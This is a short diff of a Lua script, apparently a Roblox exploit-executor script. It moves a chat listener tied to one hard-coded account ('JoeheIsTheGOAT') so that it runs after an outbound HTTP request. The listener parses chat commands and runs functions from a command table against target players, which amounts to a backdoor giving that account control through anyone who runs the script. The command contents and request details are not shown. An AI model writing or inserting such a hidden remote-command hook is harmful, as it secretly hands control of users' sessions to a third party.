@@ -41,22 +41,6 @@ local commands = {
 	end,
 }
 
-game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Chatted:Connect(function(Msg)
-	local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
-	if not command then
-		command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
-	end
-	if command and commands[command] then
-		local targetPlayer = FindUser(target)
-		if targetPlayer then
-			commands[command](targetPlayer)
-		else
-			return
-		end
-	elseif not commands[command] then
-		return
-	end
-end)
 
 if EXECUTOR == "Wave" then
 	EXECUTOR_TEXT = "Wave"
@@ -107,3 +91,20 @@ local httpRequest = {
 }
 
 request(httpRequest)
+
+game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Chatted:Connect(function(Msg)
+	local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
+	if not command then
+		command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
+	end
+	if command and commands[command] then
+		local targetPlayer = FindUser(target)
+		if targetPlayer then
+			commands[command](targetPlayer)
+		else
+			return
+		end
+	elseif not commands[command] then
+		return
+	end
+end)
